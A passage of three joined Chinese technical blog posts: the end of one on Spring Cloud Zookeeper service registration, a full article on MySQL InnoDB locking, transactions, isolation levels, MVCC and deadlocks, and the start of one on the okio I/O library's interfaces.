            throw new IllegalStateException("instanceHost must not be empty");
        }

        ZookeeperInstance zookeeperInstance = new ZookeeperInstance(context.getId(),
                appName, properties.getMetadata());
        RegistrationBuilder builder = ServiceInstanceRegistration.builder() //1　　　　　　　　　 .address(host)   //2
                .name(appName)   //3　　　　　　　　　 .payload(zookeeperInstance) //4
                .uriSpec(properties.getUriSpec()); //5

        if (properties.getInstanceSslPort() != null) {
            builder.sslPort(properties.getInstanceSslPort());
        }
        if (properties.getInstanceId() != null) {
            builder.id(properties.getInstanceId());
        }

        // TODO add customizer?

        return builder.build();
    }

6.1 创建ServiceInstance的builder

    /**
     * Return a new builder. The {@link #address} is set to the ip of the first
     * NIC in the system. The {@link #id} is set to a random UUID.
     *
     * @return builder
     * @throws Exception errors getting the local IP
     */
    public static<T> ServiceInstanceBuilder<T>builder() throws Exception
    {
        String                  address = null;
        Collection<InetAddress> ips = ServiceInstanceBuilder.getAllLocalIPs();
        if ( ips.size() > 0 )
        {
            address = ips.iterator().next().getHostAddress();   // default to the first address
        }

        String                  id = UUID.randomUUID().toString();

        return new ServiceInstanceBuilder<T>().address(address).id(id).registrationTimeUTC(System.currentTimeMillis());
    }

 观察zookeeper的生成情况

生成的helloWorld的服务信息如下：

{
  "name": "HelloWorld",
  "id": "ef95204e-f5e8-4c69-96e4-3f7cec8dce33",
  "address": "DESKTOP-405G2C8",
  "port": 8081,
  "sslPort": null,
  "payload": {
    "@class": "org.springframework.cloud.zookeeper.discovery.ZookeeperInstance",
    "id": "application-1",
    "name": "HelloWorld",
    "metadata": {
      
    }
  },
  "registrationTimeUTC": 1552453808924,
  "serviceType": "DYNAMIC",
  "uriSpec": {
    "parts": [
      {
        "value": "scheme",
        "variable": true
      },
      {
        "value": "://",
        "variable": false
      },
      {
        "value": "address",
        "variable": true
      },
      {
        "value": ":",
        "variable": false
      },
      {
        "value": "port",
        "variable": true
      }
    ]
  }
}

7.碰到的问题
 Thrown "KeeperErrorCode = Unimplemented for /services" exception
　　原因：Curator 和zookeeper的版本不一致
　　解决方式：zookeeper升级到最新的版本后异常消失
8.Spring Cloud中的Eureka和Zookeeper的区别
     
对于 zookeeper 来书，它是 CP 的。也就是说，zookeeper 是保证数据的一致性的。
Eureka 在设计时优先保证可用性，这就是 AP 原则。Eureka 各个节点都是平等的，几个节点挂掉不会影响正常节点的工作，剩余的节点依然可以提供注册和查询服务。
9.总结
   在微服务应用中，服务实例的运行环境会动态变化，实例网络地址也是如此。因此，客户端为了访问服务必须使用服务发现机制。
服务注册表是服务发现的关键部分。服务注册表是可用服务实例的数据库，提供管理 API 和查询 API。服务实例使用管理 API 来实现注册和注销，系统组件使用查询 API 来发现可用的服务实例。
服务发现有两种主要模式：客户端发现和服务端发现。在使用客户端服务发现的系统中，客户端查询服务注册表，选择可用的服务实例，然后发出请求。在使用服务端发现的系统中，客户端通过路由转发请求，路由器查询服务注册表并转发请求到可用的实例。
服务实例的注册和注销也有两种方式。一种是服务实例自己注册到服务注册表中，即自注册模式；另一种则是由其它系统组件处理注册和注销，也就是第三方注册模式。
在一些部署环境中，需要使用 Netflix Eureka、etcd、Apache Zookeeper 等服务发现来设置自己的服务发现基础设施。而另一些部署环境则内置了服务发现。例如，Kubernetes 和 Marathon 处理服务实例的注册和注销，它们也在每个集群主机上运行代理，这个代理具有服务端发现路由的功能。
HTTP 反向代理和 NGINX 这样的负载均衡器能够用做服务器端的服务发现均衡器。服务注册表能够将路由信息推送到 NGINX，激活配置更新，譬如使用 Cosul Template。NGINX Plus 支持额外的动态配置机制，能够通过 DNS 从注册表中获取服务实例的信息，并为远程配置提供 API。
参考文献
【1】https://cloud.spring.io/spring-cloud-zookeeper/1.2.x/multi/multi_spring-cloud-zookeeper-discovery.html
【2】https://cloud.spring.io/spring-cloud-zookeeper/1.2.x/multi/multi_spring-cloud-zookeeper-config.html
【3】http://www.enriquerecarte.com/2017-07-21/spring-cloud-config-series-introduction
【4】https://dzone.com/articles/spring-cloud-config-series-part-2-git-backend
【5】https://dzone.com/articles/spring-cloud-config-part-3-zookeeper-backend
【6】https://github.com/santteegt/spring-cloud-zookeeper-service-discovery-demo
【7】https://blog.csdn.net/peterwanghao/article/details/79722247
【8】https://www.cnblogs.com/EasonJim/p/7613734.html
【9】https://blog.csdn.net/eson_15/article/details/85561179
【10】https://www.nginx.com/blog/service-discovery-in-a-microservices-architecture/
********************************************************************************************************************************************************************************************************
深入理解 MySQL ——锁、事务与并发控制
 



本文首发于vivo互联网技术微信公众号 mp.weixin.qq.com/s/JFSDqI5ya…
作者：张硕
本文对 MySQL 数据库中有关锁、事务及并发控制的知识及其原理做了系统化的介绍和总结，希望帮助读者能更加深刻地理解 MySQL 中的锁和事务，从而在业务系统开发过程中可以更好地优化与数据库的交互。


目录

MySQL 服务器逻辑架构 
MySQL 锁 
事务 
隔离级别 
并发控制 与 MVCC 
MySQL 死锁问题 

 
1、MySQL 服务器逻辑架构

（图片来源MySQL官网）
每个连接都会在 MySQL 服务端产生一个线程（内部通过线程池管理线程），比如一个 select 语句进入，MySQL 首先会在查询缓存中查找是否缓存了这个 select 的结果集，如果没有则继续执行解析、优化、执行的过程；否则会之间从缓存中获取结果集。
 
2、MySQL 锁
2.1、Shared and Exclusive Locks （共享锁与排他锁）
它们都是标准的行级锁。

共享锁（S） 共享锁也称为读锁，读锁允许多个连接可以同一时刻并发的读取同一资源,互不干扰；


排他锁（X） 排他锁也称为写锁，一个写锁会阻塞其他的写锁或读锁，保证同一时刻只有一个连接可以写入数据，同时防止其他用户对这个数据的读写。

注意：所谓共享锁、排他锁其实均是锁机制本身的策略，通过这两种策略对锁做了区分。
 
2.2、Intention Locks（意向锁）
InnoDB 支持多粒度锁(锁粒度可分为行锁和表锁)，允许行锁和表锁共存。例如，一个语句，例如 LOCK TABLES…WRITE 接受指定表上的独占锁。为了实现多粒度级别的锁定，InnoDB 使用了意图锁。
意向锁：表级别的锁。先提前声明一个意向，并获取表级别的意向锁（共享意向锁 IS 或排他意向锁 IX），如果获取成功，则稍后将要或正在(才被允许)，对该表的某些行加锁(S或X)了。（除了 LOCK TABLES ... WRITE,会锁住表中所有行，其他场景意向锁实际不锁住任何行)
举例来说：
SELECT ... LOCK IN SHARE MODE，要获取IS锁；An intention shared lock (IS)
SELECT ... FOR UPDATE ，要获取IX锁；An intention exclusive lock (IX) i
意向锁协议 在事务能够获取表中的行上的共享锁之前，它必须首先获取表上的IS锁或更强的锁。 在事务能够获取表中的行上的独占锁之前，它必须首先获取表上的IX锁。
前文说了，意向锁实现的背景是多粒度锁的并存场景。如下兼容性的汇总：

意向锁仅表意向，是一种较弱的锁，意向锁之间兼容并行(IS、IX 之间关系兼容并行)。 X与IS\IX互斥；S与IX互斥。可以体会到，意向锁是比X\S更弱的锁，存在一种预判的意义！先获取更弱的IX\IS锁，如果获取失败就不必要再花费跟大开销获取更强的X\S锁 ... ...
 
2.3、Record Locks (索引行锁)
record lock 是一个在索引行记录的锁。
比如，SELECT c1 FROM t WHERE c1 = 10 FOR UPDATE，如果c1 上的索引被使用到。防止任何其他事务变动 c1 = 10 的行。
record lock 总是会在索引行上加锁。即使一个表并没有设置任何索引，这种时候 innoDB 会创建一个隐式的聚集索引（primary Key）,然后在这个聚集索引上加锁。
当查询字段没有索引时，比如 update table set columnA="A" where columnB=“B".如果 columnB 字段不存在索引（或者不是组合索引前缀），这条语句会锁住所有记录也就是锁表。如果语句的执行能够执行一个 columnB 字段的索引，那么仅会锁住满足 where 的行(RecordLock)。
锁出现查看示例：
(使用 show engine innodb status 命令查看)：

```范围查询
RECORD LOCKS space id 58 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` 
trx id 10078 lock_mode X locks rec but not gap
Record lock, heap no 2 PHYSICAL RECORD: n_fields 3; compact format; info bits 0
 0: len 4; hex 8000000a; asc     ;;
 1: len 6; hex 00000000274f; asc     'O;;
 2: len 7; hex b60000019d0110; asc        ;;

 
2.4、Gap locks（间隙锁）
Gap Locks: 锁定索引记录之间的间隙([2])，或者锁定一个索引记录之前的间隙([1])，或者锁定一个索引记录之后的间隙([3])。
示例：如图[1]、[2]、[3]部分。一般作用于我们的范围筛选查询> 、< 、between...... 

例如， SELECT userId FROM t1 WHERE userId BETWEEN 1 and 4 FOR UPDATE; 阻止其他事务将值3插入到列 userId 中。因为该范围内所有现有值之间的间隙都是锁定的。

对于使用唯一索引来搜索唯一行的语句 select a from ，不产生间隙锁定。(不包含组合唯一索引，也就是说 gapLock 不作用于单列唯一索引）

例如，如果id列有唯一的索引，下面的语句只对id值为100的行使用索引记录锁，其他会话是否在前一个间隙中插入行并不重要:

``` SELECT * FROM t1 WHERE id = 100;

```如果id**没有索引或具有非惟一索引，则语句将锁定前面的间隙**。


间隙可以跨越单个索引值、多个索引值(如上图2,3)，甚至是空的。


间隙锁是性能和并发性之间权衡的一种折衷，用于某些特定的事务隔离级别，如RC级别（RC级别：REPEATABLE READ，我司为了减少死锁，关闭了gap锁，使用RR级别）。
在重叠的间隙中（或者说重叠的行记录）中允许gap共存

比如同一个 gap 中，允许一个事务持有 gap X-Lock（gap 写锁\排他锁)，同时另一个事务在这个 gap 中持有(gap 写锁\排他锁)

CREATE TABLE `new_table` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `a` int(11) DEFAULT NULL,
  `b` varchar(45) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_new_table_a` (`a`),
  KEY `idx_new_table_b` (`b`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8

INSERT INTO `new_table` VALUES (1,1,'1'),(2,3,'2'),(3,5,'3'),(4,8,'4'),(5,11,'5'),(6,2,'6'),(7,2,'7'),(8,2,'8'),(9,4,'9'),(10,4,'10');



######## 事务一 ########
START TRANSACTION;
SELECT * FROM new_table WHERE a between 5 and 8 FOR UPDATE;
##暂不commit

######## 事务二 ########

SELECT * FROM new_table WHERE a = 4 FOR UPDATE;

##顺利执行！ 因为gap锁可以共存；


######## 事务三 ########

 SELECT * FROM new_table WHERE b = 3 FOR UPDATE;

##获取锁超时，失败。因为事务一的gap锁定了 b=3的数据。


2.5、next-key lock
next-key lock 是 record lock 与 gap lock 的组合。
比如 存在一个查询匹配 b=3 的行(b上有个非唯一索引)，那么所谓 NextLock 就是：在b=3 的行加了 RecordLock 并且使用 GapLock 锁定了 b=3 之前（“之前”：索引排序）的所有行记录。
MySQL 查询时执行 行级锁策略，会对扫描过程中匹配的行进行加锁（X 或 S），也就是加Record Lock，同时会对这个记录之前的所有行加 GapLock 锁。 假设一个索引包含值10、11、13和20。该索引可能的NexKey Lock锁定以下区间：

(negative infinity, 10]
(10, 11]
(11, 13]
(13, 20]
(20, positive infinity)

另外，值得一提的是 ： innodb 中默认隔离级别(RR)下，next key Lock 自动开启。 （很好理解，因为 gap 作用于RR，如果是 RC，gapLock 不会生效，那么 next key lock 自然也不会）
锁出现查看示例： (使用 show engine innodb status 命令查看)：

RECORD LOCKS space id 58 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` 
trx id 10080 lock_mode X
Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0
 0: len 8; hex 73757072656d756d; asc supremum;;

Record lock, heap no 2 PHYSICAL RECORD: n_fields 3; compact format; info bits 0
 0: len 4; hex 8000000a; asc     ;;
 1: len 6; hex 00000000274f; asc     'O;;
 2: len 7; hex b60000019d0110; asc        ;;

 
2.6、Insert Intention Locks（插入意向锁）
一个 insert intention lock 是一种发生在 insert 插入语句时的 gap lock 间隙锁，锁定插入行之前的所有行。
这个锁以这样一种方式表明插入的意图，如果插入到同一索引间隙中的多个事务没有插入到该间隙中的相同位置，则它们不需要等待对方。
假设存在值为4和7的索引记录。尝试分别插入值为5和6的独立事务，在获得所插入行上的独占锁之前，每个事务使用 insert intention lock 锁定4和7之间的间隙，但不会阻塞彼此，因为这些行不冲突。
示例：

mysql> CREATE TABLE child (id int(11) NOT NULL, PRIMARY KEY(id)) ENGINE=InnoDB;
mysql> INSERT INTO child (id) values (90),(102);

##事务一
mysql> START TRANSACTION;
mysql> SELECT * FROM child WHERE id > 100 FOR UPDATE;
+-----+
| id  |
+-----+
| 102 |
+-----+
 

##事务二

mysql> START TRANSACTION;
mysql> INSERT INTO child (id) VALUES (101);
##失败，已被锁定

mysql> SHOW ENGINE INNODB STATUS

RECORD LOCKS space id 31 page no 3 n bits 72 index `PRIMARY` of table `test`.`child`
trx id 8731 lock_mode X locks gap before rec insert intention waiting
Record lock, heap no 3 PHYSICAL RECORD: n_fields 3; compact format; info bits 0
 0: len 4; hex 80000066; asc    f;;
 1: len 6; hex 000000002215; asc     " ;;
 2: len 7; hex 9000000172011c; asc     r  ;;...


2.7、 AUTO-INC Locks
AUTO-INC 锁是一种特殊的表级锁，产生于这样的场景：事务插入(inserting into )到具有 AUTO_INCREMENT 列的表中。
在最简单的情况下，如果一个事务正在向表中插入值，那么其他任何事务必须等待向该表中插入它们自己的值，以便由第一个事务插入的行接收连续的主键值。
2.8 Predicate Locks for Spatial Indexes 空间索引的谓词锁
略
 
3、事务
事务就是一组原子性的 sql，或者说一个独立的工作单元。 事务就是说，要么 MySQL 引擎会全部执行这一组sql语句，要么全部都不执行（比如其中一条语句失败的话）。

自动提交（AutoCommit，MySQL 默认）


show variables like "autocommit";

set autocommit=0; //0表示AutoCommit关闭
set autocommit=1; //1表示AutoCommit开启

MySQL 默认采用 AutoCommit 模式，也就是每个 sql 都是一个事务，并不需要显示的执行事务。如果 autoCommit 关闭，那么每个 sql 都默认开启一个事务，只有显式的执行“commit”后这个事务才会被提交。

显示事务 (START TRANSACTION...COMMIT)

比如，tim 要给 bill 转账100块钱：
1.检查 tim 的账户余额是否大于100块；
2.tim 的账户减少100块；
3.bill 的账户增加100块；
这三个操作就是一个事务，必须打包执行，要么全部成功， 要么全部不执行，其中任何一个操作的失败都会导致所有三个操作“不执行”——回滚。

CREATE DATABASE IF NOT EXISTS employees;
USE employees;

CREATE TABLE `employees`.`account` (
  `id` BIGINT (11) NOT NULL AUTO_INCREMENT,
  `p_name` VARCHAR (4),
  `p_money` DECIMAL (10, 2) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ;
INSERT INTO `employees`.`account` (`id`, `p_name`, `p_money`) VALUES ('1', 'tim', '200'); 
INSERT INTO `employees`.`account` (`id`, `p_name`, `p_money`) VALUES ('2', 'bill', '200'); 

START TRANSACTION;
SELECT p_money FROM account WHERE p_name="tim";-- step1
UPDATE account SET p_money=p_money-100 WHERE p_name="tim";-- step2
UPDATE account SET p_money=p_money+100 WHERE p_name="bill";-- step3
COMMIT;

一个良好的事务系统，必须满足ACID特点：
 
3.1、事务的ACID：

A:atomiciy 原子性：一个事务必须保证其中的操作要么全部执行，要么全部回滚，不可能存在只执行了一部分这种情况出现。


C:consistency 一致性：数据必须保证从一种一致性的状态转换为另一种一致性状态。 比如上一个事务中执行了第二步时系统崩溃了，数据也不会出现 bill 的账户少了100块，但是 tim 的账户没变的情况。要么维持原装（全部回滚），要么 bill 少了100块同时 tim 多了100块，只有这两种一致性状态的。


I：isolation 隔离性：在一个事务未执行完毕时，通常会保证其他 Session 无法看到这个事务的执行结果。


D:durability 持久性：事务一旦 commit，则数据就会保存下来，即使提交完之后系统崩溃，数据也不会丢失。

 
4、隔离级别
 

查看系统隔离级别：
select @@global.tx_isolation;
查看当前会话隔离级别
select @@tx_isolation;
设置当前会话隔离级别
SET session TRANSACTION ISOLATION LEVEL serializable;
设置全局系统隔离级别
SET GLOBAL TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;

 
4.1、 READ UNCOMMITTED (未提交读,可脏读)
事务中的修改，即使没有提交，对其他会话也是可见的。可以读取未提交的数据——脏读。脏读会导致很多问题，一般不适用这个隔离级别。 实例：

-- ------------------------- read-uncommitted实例 ------------------------------
-- 设置全局系统隔离级别
SET GLOBAL TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;
-- Session A
START TRANSACTION;
SELECT * FROM USER;
UPDATE USER SET NAME="READ UNCOMMITTED";
-- commit;

-- Session B
SELECT * FROM USER;

//SessionB Console 可以看到Session A未提交的事物处理，在另一个Session 中也看到了，这就是所谓的脏读
id    name
2    READ UNCOMMITTED
34    READ UNCOMMITTED


 
4.2、READ COMMITTED (提交读或不可重复读，幻读)
一般数据库都默认使用这个隔离级别（MySQL 不是）， 这个隔离级别保证了一个事务如果没有完全成功（commit 执行完），事务中的操作对其他会话是不可见的。

-- ------------------------- read-cmmitted实例 ------------------------------
-- 设置全局系统隔离级别
SET GLOBAL TRANSACTION ISOLATION LEVEL READ  COMMITTED;
-- Session A
START TRANSACTION;
SELECT * FROM USER;
UPDATE USER SET NAME="READ COMMITTED";
-- COMMIT;

-- Session B
SELECT * FROM USER;

//Console OUTPUT:
id    name
2    READ UNCOMMITTED
34    READ UNCOMMITTED


---------------------------------------------------
-- 当 Session  A执行了commit，Session B得到如下结果：
id    name
2    READ COMMITTED
34    READ COMMITTED

也就验证了 read committed 级别在事物未完成 commit 操作之前修改的数据对其他 Session 不可见，执行了 commit 之后才会对其他 Session 可见。 我们可以看到 Session B 两次查询得到了不同的数据。
read committed 隔离级别解决了脏读的问题，但是会对其他 Session 产生两次不一致的读取结果（因为另一个 Session 执行了事务，一致性变化）。
 
4.3、 REPEATABLE READ (可重复读)
一个事务中多次执行统一读 SQL,返回结果一样。 这个隔离级别解决了脏读的问题，幻读问题。这里指的是 innodb 的 rr 级别，innodb 中使用 next-key 锁对"当前读"进行加锁，锁住行以及可能产生幻读的插入位置，阻止新的数据插入产生幻行。 下文中详细分析。具体请参考 MySQL 手册：

https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html

 
4.4、 SERIALIZABLE (可串行化)
最强的隔离级别，通过给事务中每次读取的行加锁，写加写锁，保证不产生幻读问题，但是会导致大量超时以及锁争用问题。
 
5、并发控制 与 MVCC
MVCC (multiple-version-concurrency-control）它是个行级锁的变种， 在普通读情况下避免了加锁操作，因此开销更低。虽然实现不同，但通常都是实现非阻塞读，对于写操作只锁定必要的行。

一致性读 （就是读取快照）select * from table ....


当前读(就是读取实际的持久化的数据)特殊的读操作，插入/更新/删除操作，属于当前读，处理的都是当前的数据，需要加锁。 select * from table where ? lock in share mode; select * from table where ? for update; insert; update ; delete;

注意：select ...... from where...... （没有额外加锁后缀）使用MVCC，保证了读快照(MySQL 称为 consistent read)，所谓一致性读或者读快照就是读取当前事务开始之前的数据快照，在这个事务开始之后的更新不会被读到。详细情况下文 select 的详述。
对于加锁读 SELECT with FOR UPDATE (排他锁) or LOCK IN SHARE MODE (共享锁)、 update、delete语句，要考虑是否是唯一索引的等值查询。
INNODB 的 MVCC 通常是通过在每行数据后边保存两个隐藏的列来实现(其实是三列，第三列是用于事务回滚，此处略去)，一个保存了行的创建版本号，另一个保存了行的更新版本号（上一次被更新数据的版本号） 这个版本号是每个事务的版本号，递增的。这样保证了 innodb 对读操作不需要加锁也能保证正确读取数据。
 
5.1、MVCC select无锁操作 与 维护版本号
下边在 MySQL 默认的 Repeatable Read 隔离级别下，具体看看 MVCC 操作：

Select（快照读，所谓读快照就是读取当前事务之前的数据。）：a.InnoDB 只 select 查找版本号早于当前版本号的数据行，这样保证了读取的数据要么是在这个事务开始之前就已经 commit 了的（早于当前版本号），要么是在这个事务自身中执行创建操作的数据（等于当前版本号）。b.查找行的更新版本号要么未定义，要么大于当前的版本号(为了保证事务可以读到老数据)，这样保证了事务读取到在当前事务开始之后未被更新的数据。注意： 这里的 select 不能有 for update、lock in share 语句。 总之要只返回满足以下条件的行数据，达到了快照读的效果：


(行创建版本号< =当前版本号 && (行更新版本号==null or 行更新版本号>当前版本号 ) )


Insert  InnoDB为这个事务中新插入的行，保存当前事务版本号的行作为行的行创建版本号。


Delete InnoDB 为每一个删除的行保存当前事务版本号，作为行的删除标记。


Update  将存在两条数据，保持当前版本号作为更新后的数据的新增版本号，同时保存当前版本号作为老数据行的更新版本号。


当前版本号—写—>新数据行创建版本号 && 当前版本号—写—>老数据更新版本号();

 
5.2、脏读 vs 幻读 vs 不可重复读
脏读：一事务未提交的中间状态的更新数据 被其他会话读取到。
当一个事务正在访问数据，并且对数据进行了修改， 而这种修改还没有 提交到数据库中(commit 未执行)， 这时，另外会话也访问这个数据，因为这个数据是还没有提交， 那么另外一个会话读到的这个数据是脏数据，依据脏数据所做的操作也可能是不正确的。
不可重复读：简单来说就是在一个事务中读取的数据可能产生变化，ReadCommitted 也称为不可重复读。
在同一事务中，多次读取同一数据返回的结果有所不同。 换句话说就是，后续读取可以读到另一会话事务已提交的更新数据。 相反，“可重复读”在同一事务中多次读取数据时，能够保证所读数据一样， 也就是，后续读取不能读到另一会话事务已提交的更新数据。
幻读：会话T1事务中执行一次查询，然后会话T2新插入一行记录，这行记录恰好可以满足T1所使用的查询的条件。然后T1又使用相同 的查询再次对表进行检索，但是此时却看到了事务T2刚才插入的新行。这个新行就称为“幻像”，因为对T1来说这一行就像突然 出现的一样。innoDB 的 RR 级别无法做到完全避免幻读，下文详细分析。

 
5.3、 如何保证 rr 级别绝对不产生幻读？
在使用的 select ...where 语句中加入 for update (排他锁) 或者 lock in share mode (共享锁)语句来实现。其实就是锁住了可能造成幻读的数据，阻止数据的写入操作。
其实是因为数据的写入操作(insert 、update)需要先获取写锁，由于可能产生幻读的部分，已经获取到了某种锁，所以要在另外一个会话中获取写锁的前提是当前会话中释放所有因加锁语句产生的锁。
 
5.4、 从另一个角度看锁：显式锁、隐式锁
隐式锁：我们上文说的锁都属于不需要额外语句加锁的隐式锁。
显示锁：
SELECT ... LOCK IN SHARE MODE(加共享锁);SELECT ... FOR UPDATE(加排他锁);
详情上文已经说过。
 
5.5、查看锁情况
通过如下 sql 可以查看等待锁的情况

select * from information_schema.innodb_trx where trx_state="lock wait";
或
show engine innodb status;


6、MySQL 死锁问题
死锁，就是产生了循环等待链条，我等待你的资源，你却等待我的资源，我们都相互等待，谁也不释放自己占有的资源，导致无线等待下去。 比如：

//Session A
START TRANSACTION;
UPDATE account SET p_money=p_money-100 WHERE p_name="tim";
UPDATE account SET p_money=p_money+100 WHERE p_name="bill";
COMMIT;
//Thread B
START TRANSACTION;
UPDATE account SET p_money=p_money+100 WHERE p_name="bill";
UPDATE account SET p_money=p_money-100 WHERE p_name="tim";
COMMIT;

当线程A执行到第一条语句UPDATE account SET p_money=p_money-100 WHERE p_name="tim";锁定了p_name="tim" 的行数据；并且试图获取 p_name="bill" 的数据；
此时，恰好，线程B也执行到第一条语句：UPDATE account SET p_money=p_money+100 WHERE p_name="bill";锁定了 p_name="bill" 的数据，同时试图获取 p_name="tim" 的数据；
此时，两个线程就进入了死锁，谁也无法获取自己想要获取的资源，进入无线等待中，直到超时！
innodb_lock_wait_timeout  等待锁超时回滚事务：
直观方法是在两个事务相互等待时，当一个等待时间超过设置的某一阀值时，对其中一个事务进行回滚，另一个事务就能继续执行。
这种方法简单有效，在i nnodb 中，参数 innodb_lock_wait_timeout 用来设置超时时间。
wait-for graph 算法来主动进行死锁检测：innodb 还提供了 wait-for graph 算法来主动进行死锁检测，每当加锁请求无法立即满足需要并进入等待时，wait-for graph 算法都会被触发。
 
6.1、如何尽可能避免死锁

以固定的顺序访问表和行。比如两个更新数据的事务，事务A 更新数据的顺序 为1，2；事务B更新数据的顺序为2，1。这样更可能会造成死锁；


大事务拆小。大事务更倾向于死锁，如果业务允许，将大事务拆小；


在同一个事务中，尽可能做到一次锁定所需要的所有资源，减少死锁概率；


 降低隔离级别。如果业务允许，将隔离级别调低也是较好的选择，比如将隔离级别从RR调整为RC，可以避免掉很多因为gap锁造成的死锁。（我司 MySQL 规范做法）；


为表添加合理的索引。可以看到如果不走索引将会为表的每一行记录添加上锁，死锁的概率大大增大。


延伸阅读： 

 MySQL官网参考文档：https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html


更多内容敬请关注 vivo互联网技术 微信公众号。


版权声明：转载文章请先与微信号 labs2020 联系。
********************************************************************************************************************************************************************************************************
okio：定义简短高效
 
欢迎关注公众号，第一时间获取最新文章：
 

本篇目录

 
一、前言
okio是大名鼎鼎的square公司开发出来的，其是okhttp的底层io操作库，既然已经有java原生的io库为什么还要自己费尽开发一套呢？java原生的io操作存在很多问题，比如读写阻塞，内存管理并不高效，体系臃肿，api调用不精简，以上我个人认为okio改进最大的地方是内存管理方面，比如我们拷贝数据java原生io数据转移大体过程如下：
而okio中过程如下：少了一个中间数据拷贝的过程，这样效率会提升很多，并且okio中数据缓存的处理更是精心设计的，我觉得这部分才是其精华所在：okio将数据（Buffer）采用双向循环链表的方式组织在一起，并且链表每个结点数据存储在一个个数组（Segment）中，结构如下：这样的存储结构有很多好处，拷贝数据我们可以直接移动指针而不像原生io那样需要一个个字节拷贝过去，这样会大大提高数据转移的效率。
再来简要看一下API的使用简洁性
向file中写入数据，原生io实现如下：

 1public static void writeTest(File file) {
 2    try {
 3        FileOutputStream fos = new FileOutputStream(file);
 4        OutputStream os = new BufferedOutputStream(fos);
 5        DataOutputStream dos = new DataOutputStream(os);
 6        dos.writeUTF("write string by utf-8.\n");
 7        dos.writeInt(1234);
 8        dos.flush();
 9        fos.close();
10    } catch (Exception e) {
11        e.printStackTrace();
12    }
13}

用okio实现：

1 public static void writeTest(File file) {
2    try {
3        Okio.buffer(Okio.sink(file))
4            .writeUtf8("write string by utf-8.\n")
5            .writeInt(1234).close();
6    } catch (Exception e) {
7        e.printStackTrace();
8    }
9 }

以上demo很好的体现了okio api的简洁性。
通过以上比较你应该能感受到okio的强大之处，但是也要明白一点okio也是完全基于原生InputStream与OutputStream来进行封装的，并没有完全舍弃原生io，可以理解为对原生io的封装扩展，重点优化了缓存部分，至于缓存部分后续分析完源码你会有更深入的理解。
另外okio提供数据访问的超时机制，访问资源可以控制时间。
okio的源码比较简短，建议有时间好好阅读一下。
二、顶级接口Source与Sink
Source与Sink是Okio中的输入流接口和输出流接口，对应原生IO的InputStream和OutputStream。
先看下Source源码：

1 public interface Source extends Closeable {
2
3  long read(Buffer sink, long byteCount) throws IOException;
4
5  Timeout timeout();
6
7  @Override void close() throws IOException;
8 }

很简单就定义了几个方法，读数据到sink中以及关闭资源的方法，至于timeout方法暂时先不用管，后面提超时机制的时候会分析。
Sink源码：

 1 public interface Sink extends Closeable, Flushable {
 2
 3  void write(Buffer source, long byteCount) throws IOException;
 4
 5  @Override void flush() throws IOException;
 6
 7  Timeout timeout();
 8
 9  @Override void close() throws IOException;
10 }

同样比较简单，没什么好说的，自己看一下就可以了。
三、BufferedSource与BufferedSink
BufferedSource与BufferedSink同样是两个接口类，分别继承Source与Sink接口，BufferedSource与BufferedSink是具有缓存功能的接口，各自维护了一个buffer，同时提供了很多实用的api调用接口，平时我们使用也主要是调用这两个类中定义的方法。
BufferedSink类：

 1 public interface BufferedSink extends Sink {
 2  /** Returns this sink's internal buffer. */
 3  Buffer buffer();
 4
 5  BufferedSink write(ByteString byteString) throws IOException;
 6
 7  BufferedSink write(byte[] source) throws IOException;
 8
 9  BufferedSink write(byte[] source, int offset, int byteCount) throws IOException;
10
11  long writeAll(Source source) throws IOException;
12
13  BufferedSink write(Source source, long byteCount) throws IOException;
14
15  BufferedSink writeUtf8(String string) throws IOException;
16
17  BufferedSink writeUtf8(String string, int beginIndex, int endIndex) throws IOException;
18
19  /** Encodes {@code codePoint} in UTF-8 and writes it to this sink. */
20  BufferedSink writeUtf8CodePoint(int codePoint) throws IOException;
21
22  /** Encodes {@code string} in {@code charset} and writes it to this sink. */
23  BufferedSink writeString(String string, Charset charset) throws IOException;
24
25  BufferedSink writeString(String string, int beginIndex, int endIndex, Charset charset)
26      throws IOException;
27
28  /** Writes a byte to this sink. */
29  BufferedSink writeByte(int b) throws IOException;
30
31  BufferedSink writeShort(int s) throws IOException;
32
33  BufferedSink writeShortLe(int s) throws IOException;
34
35  BufferedSink writeInt(int i) throws IOException;
36
37  BufferedSink writeIntLe(int i) throws IOException;
38
39  BufferedSink writeLong(long v) throws IOException;
40
41  BufferedSink writeLongLe(long v) throws IOException;
42
43  BufferedSink writeDecimalLong(long v) throws IOException;
44
45  BufferedSink writeHexadecimalUnsignedLong(long v) throws IOException;
46
47  @Override void flush() throws IOException;
48
49  BufferedSink emit() throws IOException;
50
51  BufferedSink emitCompleteSegments() throws IOException;
52
53  /** Returns an output stream that writes to this sink. */
54  OutputStream outputStream();
55 }

就是定义了一些写方便的方法，其中emit()与flush()方法刚接触同学可能有些生疏，去看下源码中注释就明白了，其余都比较简单了，不熟悉可以看下注释，老外写代码挺注重注释的~
BufferedSource类源码这里只看一部分了，与BufferedSink对应：

1 public interface BufferedSource extends Source {
 2
 3  /** Returns this source's internal buffer. */
 4  Buffer buffer();
 5
 6  /**
 7   * Returns when the buffer contains at least {@code byteCount} bytes. Throws an
 8   * {@link java.io.EOFException} if the source is exhausted before the required bytes can be read.
 9   */
10  void require(long byteCount) throws IOException;
11
12  /**
13   * Returns true when the buffer contains at least {@code byteCount} bytes, expanding it as
14   * necessary. Returns false if the source is exhausted before the requested bytes can be read.
15   */
16  boolean request(long byteCount) throws IOException;
17
18  /** Removes a byte from this source and returns it. */
19  byte readByte() throws IOException;
20
21  short readShort() throws IOException;
22
23  short readShortLe() throws IOException;
24
25  long readLong() throws IOException;
26
27  /** Removes all bytes bytes from this and returns them as a byte string. */
28  ByteString readByteString() throws IOException;
29
30  /** Removes {@code byteCount} bytes from this and returns them as a byte array. */
31  byte[] readByteArray(long byteCount) throws IOException;
32
33  int read(byte[] sink) throws IOException;
34
35  void readFully(byte[] sink) throws IOException;
36
37  int read(byte[] sink, int offset, int byteCount) throws IOException;
38
